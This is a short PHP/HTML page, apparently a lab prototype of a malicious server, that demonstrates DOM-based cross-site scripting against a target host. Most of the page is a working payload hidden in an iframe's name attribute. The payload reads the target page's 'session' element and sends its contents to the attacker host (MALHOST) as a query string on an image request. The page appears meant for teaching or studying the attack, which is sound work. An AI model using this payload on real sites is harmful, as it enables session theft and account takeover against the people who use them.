<?php
include('../declare.php');
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Malicious server prototype: DOM-based XSS</title>
</head>
<body>
<h1>DOM-based XSS</h1>
<iframe id="embedder" name="dummy<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='<?=MALHOST?>images/attack.png?'+encodeURIComponent(e.textContent);e.appendChild(i);</script>" width="400" height="400" src="<?=TGTHOST?>dombased/target"></iframe>
<a href="<?=TGTHOST?>dombased/start">dom-based XSS start</a> |
<a href="<?=TGTHOST?>home">target server home</a>
</body>
</html>

